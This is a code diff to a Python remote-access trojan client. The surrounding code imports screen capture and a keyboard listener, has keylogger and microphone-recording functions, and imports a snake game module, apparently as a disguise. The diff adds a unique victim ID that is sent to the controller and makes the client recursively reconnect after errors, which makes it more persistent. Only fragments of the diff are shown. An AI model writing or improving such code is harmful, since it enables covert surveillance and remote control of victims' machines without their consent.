@@ -13,6 +13,7 @@ from PIL import ImageGrab
 from pynput import keyboard
 import json
 from jeu.snake import jeu 
+import uuid
 
 
 stopkeylogg = False
@@ -168,6 +169,8 @@ def record_microphone():
 def rat_client():
 	global stopmic,stopkeylogg
 	s = connect()
+	CLIENT_ID = str(uuid.uuid4())
+	s.send(CLIENT_ID.encode())
 	try:
 		while True:
 			data = s.recv(1000000)
@@ -236,13 +239,14 @@ def rat_client():
 				s.send(str.encode(output))
 	except socket.error as e:
 		print(f"Socket error: {e}. Reconnecting...")
-		
+		s.close()
 	except Exception as e:
 		print(f"An error occurred: {e}")
 		
 		s.send(str.encode(f"Error: {str(e)}"))
 	finally:
 		s.close()
+		rat_client()
 
 
 
